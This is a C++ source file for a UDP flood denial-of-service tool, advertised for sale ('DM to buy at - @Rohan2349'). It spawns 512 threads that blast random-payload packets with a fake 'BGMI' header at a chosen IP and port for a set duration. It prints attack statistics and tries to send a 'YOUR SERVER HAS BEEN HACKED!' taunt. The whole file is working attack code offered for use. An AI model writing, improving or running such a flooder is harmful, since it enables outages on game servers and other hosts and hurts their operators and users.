#include <iostream>
#include <iomanip>
#include <thread>
#include <vector>
#include <mutex>
#include <chrono>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <string>
#include <cstring>
#include <fcntl.h>
#include <atomic>

#define MAX_PACKET_SIZE 65507
#define FAKE_ERROR_DELAY 677
#define MIN_PACKET_SIZE 1
#define DEFAULT_NUM_THREADS 512

std::atomic<long long> totalPacketsSent(0);
long long totalSendFailures = 0;
double totalDataMB = 0.0;
std::mutex statsMutex;
bool keepSending = true;
bool keepReceiving = true;

void countdown(int duration) {
    auto start = std::chrono::steady_clock::now();
    for (int i = duration; i > 0 && keepSending; --i) {
        std::cout << "\rTime Left: " << i << " seconds" << std::flush;
        auto now = std::chrono::steady_clock::now();
        auto elapsed = std::chrono::duration_cast<std::chrono::seconds>(now - start).count();
        if (elapsed > 0 && elapsed % 60 == 0) {
            double rate = totalPacketsSent / elapsed;
            std::cerr << "\nRate at " << elapsed << "s: " << rate << " packets/s" << std::flush;
        }
        std::this_thread::sleep_for(std::chrono::seconds(1));
        if (elapsed + 1 < i) {
            std::cerr << "\nCountdown stalled at " << i << "s, elapsed: " << elapsed << "s\n";
        }
    }
    std::cout << "\rTime Left: 0 seconds" << std::endl;
}

void packetSender(int threadId, const std::string& targetIp, int baseTargetPort, int durationSeconds, int packetSize, int numThreads) {
    int udpSocket;
    struct sockaddr_in serverAddr;
    char* packet = new char[packetSize];
    std::srand(threadId + time(nullptr));

    udpSocket = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (udpSocket < 0) {
        std::cerr << "Thread " << threadId << ": Socket creation failed\n";
        delete[] packet;
        return;
    }

    struct sockaddr_in localAddr;
    localAddr.sin_family = AF_INET;
    localAddr.sin_addr.s_addr = INADDR_ANY;
    localAddr.sin_port = 0;
    if (bind(udpSocket, (struct sockaddr*)&localAddr, sizeof(localAddr)) < 0) {
        std::cerr << "Thread " << threadId << ": Bind failed\n";
        close(udpSocket);
        delete[] packet;
        return;
    }

    serverAddr.sin_family = AF_INET;
    serverAddr.sin_addr.s_addr = inet_addr(targetIp.c_str());

    std::string fakeHeader = "BGMI" + std::to_string(rand() % 9999) + "|" + std::to_string(threadId % 100) + ":";
    int headerLen = std::min((int)fakeHeader.length(), packetSize);
    std::memcpy(packet, fakeHeader.c_str(), headerLen);
    for (int i = headerLen; i < packetSize - 1; i++) {
        packet[i] = rand() % 256;
    }
    packet[packetSize - 1] = '\0';

    long long threadPackets = 0;
    long long threadFailures = 0;
    double threadDataMB = 0.0;
    auto startTime = std::chrono::steady_clock::now();

    while (keepSending) {
        auto now = std::chrono::steady_clock::now();
        auto elapsed = std::chrono::duration_cast<std::chrono::seconds>(now - startTime).count();
        if (elapsed >= durationSeconds) break;

        int targetPort = baseTargetPort;
        if (elapsed > 240 && elapsed % 30 == 0) {
            targetPort += (rand() % 50);
        }
        serverAddr.sin_port = htons(targetPort);

        int burstSize = 5;
        int successfulSends = 0;
        for (int burst = 0; burst < burstSize && keepSending; burst++) {
            ssize_t bytesSent = sendto(udpSocket, packet, packetSize, 0,
                                     (struct sockaddr*)&serverAddr, sizeof(serverAddr));
            if (bytesSent > 0) {
                threadPackets++;
                threadDataMB += static_cast<double>(bytesSent) / (1024.0 * 1024.0);
                successfulSends++;
            } else if (bytesSent < 0) {
                threadFailures++;
                std::this_thread::sleep_for(std::chrono::milliseconds(FAKE_ERROR_DELAY));
                if (threadId == 0) {
                    std::cerr << "Send failed at " << elapsed << "s\n";
                }
                break;
            }
        }
        totalPacketsSent += successfulSends;
        if (threadId == 0 && elapsed % 30 == 0) {
            std::cerr << "Thread 0 burst at " << elapsed << "s: " << successfulSends << "/" << burstSize << " sent\n";
        }
    }

    {
        std::lock_guard<std::mutex> lock(statsMutex);
        totalSendFailures += threadFailures;
        totalDataMB += threadDataMB;
    }

    close(udpSocket);
    delete[] packet;
}

void packetReceiver(int listenPort, int packetSize) {
    int udpSocket;
    struct sockaddr_in serverAddr, clientAddr;
    char* buffer = new char[packetSize];
    socklen_t clientLen = sizeof(clientAddr);

    udpSocket = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (udpSocket < 0) {
        delete[] buffer;
        return;
    }

    int flags = fcntl(udpSocket, F_GETFL, 0);
    fcntl(udpSocket, F_SETFL, flags | O_NONBLOCK);

    serverAddr.sin_family = AF_INET;
    serverAddr.sin_addr.s_addr = INADDR_ANY;
    serverAddr.sin_port = htons(listenPort);

    if (bind(udpSocket, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) < 0) {
        close(udpSocket);
        delete[] buffer;
        return;
    }

    std::string hackMessage = "YOUR SERVER HAS BEEN HACKED! TYPE 'OKAY' OR 'NO' TO RESPOND.";
    sendto(udpSocket, hackMessage.c_str(), hackMessage.length(), 0, (struct sockaddr*)&clientAddr, clientLen);

    while (keepReceiving) {
        ssize_t bytes = recvfrom(udpSocket, buffer, packetSize, 0,
                               (struct sockaddr*)&clientAddr, &clientLen);
        if (bytes > 0) {
            std::string response(buffer, bytes);
            if (response == "OKAY" || response == "NO") {
                break;
            }
        } else if (bytes < 0 && errno != EAGAIN && errno != EWOULDBLOCK) {
            break;
        }
        std::this_thread::sleep_for(std::chrono::milliseconds(10));
    }

    close(udpSocket);
    delete[] buffer;
}

int main(int argc, char* argv[]) {
    std::cout << "=======================================\n";
    std::cout << "  Welcome to Rohan Server\n";
    std::cout << "  This is fully working script\n";
    std::cout << "  DM to buy at - @Rohan2349\n";
    std::cout << "=======================================\n\n";

    if (argc < 5) {
        std::cerr << "Usage: " << argv[0] << " <ip> <port> <time> <packet_size>\n";
        return 1;
    }

    std::string targetIp = argv[1];
    int targetPort = std::stoi(argv[2]);
    int durationSeconds = std::stoi(argv[3]);
    int packetSize = std::stoi(argv[4]);

    if (packetSize > MAX_PACKET_SIZE || packetSize < MIN_PACKET_SIZE) {
        std::cerr << "Packet size must be between " << MIN_PACKET_SIZE << " and " << MAX_PACKET_SIZE << "\n";
        return 1;
    }

    std::cout << "Starting receiver thread...\n";
    std::thread receiverThread(packetReceiver, targetPort, packetSize);

    std::vector<std::thread> senderThreads;
    for (int i = 0; i < DEFAULT_NUM_THREADS; ++i) {
        senderThreads.emplace_back(packetSender, i, targetIp, targetPort, durationSeconds, packetSize, DEFAULT_NUM_THREADS);
    }

    std::cout << "\nAttack started!\n";
    auto start = std::chrono::steady_clock::now();
    std::thread countdownThread(countdown, durationSeconds);
    countdownThread.join();

    auto end = std::chrono::steady_clock::now();
    auto elapsed = std::chrono::duration_cast<std::chrono::seconds>(end - start).count();

    keepSending = false;
    for (auto& t : senderThreads) {
        t.join();
    }

    keepReceiving = false;
    receiverThread.join();

    std::cout << "\nATTACK COMPLETE\n";
    std::cout << "Total Packets Sent: " << totalPacketsSent << " packets\n";
    std::cout << "Total Send Failures: " << totalSendFailures << "\n";
    std::cout << "Total Data: " << std::fixed << std::setprecision(2) << totalDataMB << " MB\n";
    double totalRate = totalPacketsSent / (elapsed > 0 ? elapsed : 1);
    std::cout << "Average Rate: " << totalRate << " packets/s\n";
    std::cout << "DM to buy at - @Rohan2349\n";
    return 0;
}